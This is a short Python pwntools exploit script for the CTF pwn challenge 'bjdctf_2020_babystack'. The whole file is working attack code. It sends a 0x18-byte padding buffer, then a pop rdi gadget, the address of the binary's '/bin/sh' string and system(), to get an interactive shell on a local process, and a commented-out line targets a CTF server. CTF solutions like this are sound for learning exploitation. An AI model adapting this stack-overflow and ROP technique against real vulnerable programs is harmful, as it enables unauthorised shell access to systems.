from pwn import *
context(log_level='debug', arch='amd64', os='linux' )

io = process("./bjdctf_2020_babystack")
context.log_level = 'debug'
# gdb.attach(io, 'b*0x004007C0')
# io = remote("pwn.challenge.ctf.show",28066)
# io = remote("pwn.challenge.ctf.show",28066)

e = ELF("./bjdctf_2020_babystack")
system = e.symbols['system']
bin_sh = e.search(b'/bin/sh').__next__()

junk = 'a'* 0x18
pop_rdi = 0x000400833


print(system, bin_sh)
payload = flat(junk, pop_rdi, bin_sh, system)
print(io.recvuntil('name:').decode())
io.sendline('50')
print(io.recvuntil('name?').decode())
io.sendline(payload)
io.interactive()
